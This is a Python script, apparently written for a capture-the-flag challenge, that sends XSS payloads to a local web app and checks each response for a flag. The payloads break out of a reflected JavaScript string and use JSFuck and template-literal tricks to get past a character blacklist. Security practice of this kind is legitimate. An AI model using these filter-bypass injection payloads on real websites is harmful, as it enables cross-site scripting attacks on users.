import requests
import re

BASE_URL = "http://127.0.0.1:32887/page"

print("="*80)
print("JSFUCK PAYLOAD GENERATION AND TESTING")
print("="*80)

# JSFuck uses only 6 characters: []()!+
# Let's verify these work and then try to execute code

print("\n### ALLOWED CHARACTERS FOR JSFUCK ###")
print("[ ] ( ) ! + \" ; / : , . ` $ { } = - _ | \\ ' # @ % ^ & *")
print("\nCore JSFuck characters: [ ] ( ) ! +")
print("Additional useful: \" ; / (for breaking out and commenting)")
print("Template literals: ` $ { }")

# In JSFuck, we can get strings from primitives:
# ![] = false
# !![] = true
# [][[]] = undefined
# +[] = 0
# !+[]+[] = "false"
# !![]+[] = "true"

# Let's first test if breaking out of the string and executing JSFuck works
print("\n\n### Test 1: Break out and execute simple JSFuck ###")

test_payloads = [
    ('";[];//', "Empty array (should execute)"),
    ('";[][+[]];//', "Array access"),  
    ('";[][+[]]+[];//', "Undefined to string"),
    ('";![];//', "false"),
    ('";!![];//', "true"),
    ('";!![]+[];//', "true to string"),
    ('";(!![]+[])[+[]];//', "Get 't' from 'true'"),
    ('";(!![]+[])[+!![]];//', "Get 'r' from 'true'"),
]

for payload, desc in test_payloads:
    response = requests.post(BASE_URL, data={"name": payload})
    print(f"\n{desc}: {payload}")
    
    if "Sorry you can't use" in response.text:
        print("✗ BLOCKED")
    else:
        # Check if we got a flag or success
        if "success" in response.text.lower() or "congratulations" in response.text.lower():
            print("✓ SUCCESS MESSAGE DETECTED!")
        
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"🚩 FLAG: {flag_match.group(0)}")
            print(f"\nFull response:\n{response.text}")
        
        # Extract the JavaScript
        match = re.search(r'<script>\s*var name = "([^"]*)";', response.text)
        if match:
            reflected = match.group(1)
            print(f"Reflected: {reflected}")
        
        # Check image for success/fail
        if 'success_umbrella' in response.text:
            print("✓ SUCCESS IMAGE DETECTED!")
            print(f"\nFull response:\n{response.text}")
        elif 'error_umbrella' in response.text:
            print("✗ Error image (payload didn't trigger success)")

# Now let's try to use template literals with JSFuck
print("\n\n### Test 2: Template literal with JSFuck ###")

template_payloads = [
    ('";`${[]}`;//', "Template with array"),
    ('";`${![]}`;//', "Template with false"),
    ('";`${!![]}`;//', "Template with true"),
    ('";`${[][+[]]}`;//', "Template with undefined"),
]

for payload, desc in template_payloads:
    response = requests.post(BASE_URL, data={"name": payload})
    print(f"\n{desc}: {payload}")
    
    if "success" in response.text.lower():
        print("✓ SUCCESS!")
    
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        print(f"🚩 FLAG: {flag_match.group(0)}")
        print(f"\nFull response:\n{response.text}")
    
    if 'success_umbrella' in response.text:
        print("✓ SUCCESS IMAGE!")
        print(f"\nFull response:\n{response.text}")

# Try to access document or window methods using only symbols
print("\n\n### Test 3: Property access without letters ###")

# In JSFuck, we can build strings character by character:
# (!![]+[])[+[]] = "t"
# (!![]+[])[+!![]] = "r"
# (![]+[])[+[]] = "f"
# (![]+[])[+!![]] = "a"
# (![]+[])[!+[]+!+[]] = "l"
# (![]+[])[!+[]+!+[]+!+[]] = "s"
# (![]+[])[!+[]+!+[]+!+[]+!+[]] = "e"

# But let's try simpler approaches first
access_payloads = [
    ('";[][[][[]]];//', "Access via computed property"),
    ('";[][[]+![]];//', "Property with string key"),
    ('";({}+[]);//', "Object to string"),
    ('";(+{}+[]);//', "NaN to string"),
]

for payload, desc in access_payloads:
    response = requests.post(BASE_URL, data={"name": payload})
    print(f"\n{desc}: {payload}")
    
    if "Sorry you can't use" in response.text:
        print("✗ BLOCKED")
    else:
        print("✓ ALLOWED")
        
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"🚩 FLAG: {flag_match.group(0)}")
            print(f"\nFull response:\n{response.text}")
        
        if 'success_umbrella' in response.text:
            print("✓ SUCCESS IMAGE!")
            print(f"\nFull response:\n{response.text}")

# Try using throw or other control flow
print("\n\n### Test 4: Try throw or eval alternatives ###")

control_payloads = [
    ('";[][~~[]]=[];//', "Assign using bitwise"),
    ('";[,];//', "Sparse array"),
    ('";[][!+[]+!+[]];//', "Access index 2"),
]

for payload, desc in control_payloads:
    response = requests.post(BASE_URL, data={"name": payload})
    print(f"\n{desc}: {payload}")
    
    if "Sorry you can't use" in response.text:
        print("✗ BLOCKED")
    else:
        print("✓ ALLOWED")
        
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"🚩 FLAG: {flag_match.group(0)}")
            print(f"\nFull response:\n{response.text}")
        
        if 'success_umbrella' in response.text:
            print("✓ SUCCESS IMAGE!")
            # Print full response to see the flag
            print(f"\nFull response:\n{response.text}")

print("\n" + "="*80)
print("JSFUCK TESTING COMPLETE")
print("="*80)

